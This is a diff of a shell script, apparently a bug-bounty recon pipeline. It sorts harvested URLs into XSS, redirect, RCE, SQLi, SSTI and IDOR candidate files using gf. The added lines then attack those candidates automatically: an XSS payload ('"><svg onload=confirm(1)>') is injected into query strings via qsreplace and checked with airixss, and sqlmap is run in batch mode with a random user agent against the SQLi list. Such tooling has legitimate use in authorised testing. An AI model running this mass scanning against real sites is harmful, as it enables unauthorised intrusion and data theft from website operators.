@@ -23,10 +23,24 @@ wait
 mkdir output
 
 cp *.txt /output 
+wait 
 
+cd output 
+ 
+ wait
+ 
 cat mass.txt | gf xss | tee -a xss.txt
 cat mass.txt | gf redirect | tee -a redirect.txt
-cat mass.txt | gf rce | tee -a rce
-cat mass.txt | gf sqli | tee -a sqli
-cat mass.txt | gf ssti | tee -a ssti
-cat mass.txt | gf idor | tee -a idor
+cat mass.txt | gf rce | tee -a rce.txt
+cat mass.txt | gf sqli | tee -a sqli.txt
+cat mass.txt | gf ssti | tee -a ssti.txt
+cat mass.txt | gf idor | tee -a idor.txt
+
+wait
+
+cat xss.txt | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
+
+wait
+
+sqlmap -m sqli.txt --batch --random-agent --level 1
+ 
